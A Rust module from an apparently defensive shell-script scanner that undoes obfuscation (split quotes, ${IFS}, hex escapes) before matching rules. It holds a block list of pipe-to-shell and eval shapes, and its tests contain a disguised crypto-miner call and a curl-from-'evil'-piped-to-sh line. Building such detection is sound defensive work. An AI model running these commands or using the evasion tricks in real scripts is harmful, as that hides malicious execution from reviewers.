//! T1.2 normalize / constant-fold — anti-evasion.
//!
//! Substring and even AST rules can be dodged by splitting a token with empty
//! quotes or backslashes (`e""val`, `e\val`), word-splitting with `${IFS}`, or
//! hiding bytes behind `$'\x65\x76al'` escapes. None of these change what the
//! shell *runs* — they only change how it reads on the page.
//!
//! This pass folds those tricks away: it rewrites each line to the form the
//! shell would effectively execute, then re-runs the signature engine. When a
//! rule (or a dangerous builtin) appears in the **normalized** line but not the
//! raw one, the real finding is surfaced together with **`EVASION_NORMALIZED`
//! (Warn)** — the obfuscation itself is a signal.

use crate::report::{Finding, Severity};
use crate::rules;
use std::collections::HashSet;

/// Dangerous builtins/shapes that the signature engine does not cover but that
/// matter when revealed only after normalization.
const DANGER: &[&str] = &[
    "eval ", "exec ", "| sh", "|sh", "| bash", "|bash", "source ",
];

/// Run the normalize pass over `text`.
pub fn scan(text: &str, findings: &mut Vec<Finding>) {
    for (idx, raw) in text.lines().enumerate() {
        scan_line(raw, idx + 1, findings);
    }
}

fn scan_line(raw: &str, lineno: usize, findings: &mut Vec<Finding>) {
    let lower_raw = raw.to_ascii_lowercase();
    let norm = normalize(raw).to_ascii_lowercase();
    if norm == lower_raw {
        return; // nothing was hidden
    }

    // Rule hits that appear only after normalization.
    let mut raw_hits = Vec::new();
    rules::scan_line(&lower_raw, lineno, &mut raw_hits);
    let raw_codes: HashSet<&str> = raw_hits.iter().map(|f| f.code).collect();

    let mut norm_hits = Vec::new();
    rules::scan_line(&norm, lineno, &mut norm_hits);

    let mut revealed: Vec<String> = Vec::new();
    for f in norm_hits {
        if !raw_codes.contains(f.code) {
            revealed.push(f.code.to_string());
            findings.push(f);
        }
    }

    // Dangerous builtins revealed only after normalization.
    for d in DANGER {
        if norm.contains(d) && !lower_raw.contains(d) {
            let token = d.trim();
            if !revealed.iter().any(|c| c == token) {
                revealed.push(token.to_string());
            }
        }
    }

    if !revealed.is_empty() {
        let list = revealed.join(", ");
        findings.push(
            Finding::at(
                Severity::Warn,
                "EVASION_NORMALIZED",
                format!("Obfuscated command revealed after normalization ({list})"),
                lineno,
            )
            .with_arg(list),
        );
    }
}

/// Rewrite a line to the form the shell would effectively run, folding away the
/// common token-splitting and byte-hiding evasions.
fn normalize(line: &str) -> String {
    // 1. Word-splitting via the internal field separator.
    let mut s = line.replace("${IFS}", " ").replace("$IFS", " ");
    s = s.replace("$IFS$()", " ");
    // 2. Decode `\xNN`, octal `\NNN`, and `$'…'` byte escapes.
    let s = decode_escapes(&s);
    // 3. Strip the quote/backslash characters used purely to split a token.
    s.chars()
        .filter(|&c| !matches!(c, '"' | '\'' | '\\'))
        .collect()
}

/// Decode `\xHH` and `\NNN` (octal) escape sequences into their bytes; other
/// backslash sequences are left for the strip step.
fn decode_escapes(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'\\' && i + 1 < b.len() {
            match b[i + 1] {
                b'x' | b'X' if i + 3 < b.len() => {
                    if let Some(v) = hex2(b[i + 2], b[i + 3]) {
                        out.push(v as char);
                        i += 4;
                        continue;
                    }
                }
                b'0'..=b'7' => {
                    // 1–3 octal digits.
                    let mut j = i + 1;
                    let mut val: u32 = 0;
                    while j < b.len() && j < i + 4 && (b'0'..=b'7').contains(&b[j]) {
                        val = val * 8 + (b[j] - b'0') as u32;
                        j += 1;
                    }
                    if val <= 0xff {
                        out.push(val as u8 as char);
                        i = j;
                        continue;
                    }
                }
                _ => {}
            }
        }
        out.push(b[i] as char);
        i += 1;
    }
    out
}

/// Parse two hex ASCII bytes into a single value.
fn hex2(hi: u8, lo: u8) -> Option<u8> {
    let h = (hi as char).to_digit(16)?;
    let l = (lo as char).to_digit(16)?;
    Some((h * 16 + l) as u8)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn folds_empty_quote_split() {
        // `xmr""ig` hides the miner signature from a raw substring scan; the raw
        // line contains no miner token, the normalized one does.
        let line = r#"  ./xmr""ig -o stratumhost:4444"#;
        let mut f = Vec::new();
        scan(line, &mut f);
        assert!(f.iter().any(|x| x.code == "CRYPTO_MINER"), "{f:?}");
        assert!(f.iter().any(|x| x.code == "EVASION_NORMALIZED"), "{f:?}");
    }

    #[test]
    fn folds_ifs_split() {
        // `|${IFS}sh` hides the pipe-into-shell shape; folding `${IFS}` to a
        // space reveals `| sh`.
        let line = "curl http://evil/x|${IFS}sh";
        let mut f = Vec::new();
        scan(line, &mut f);
        assert!(f.iter().any(|x| x.code == "EVASION_NORMALIZED"), "{f:?}");
    }

    #[test]
    fn folds_hex_escape_eval() {
        // `$'\x65\x76\x61\x6c'` == `eval`.
        let line = r#"$'\x65\x76\x61\x6c' "$cmd""#;
        let mut f = Vec::new();
        scan(line, &mut f);
        assert!(f.iter().any(|x| x.code == "EVASION_NORMALIZED"), "{f:?}");
    }

    #[test]
    fn clean_line_no_evasion() {
        let line = "cargo build --release --locked";
        let mut f = Vec::new();
        scan(line, &mut f);
        assert!(f.is_empty(), "{f:?}");
    }
}
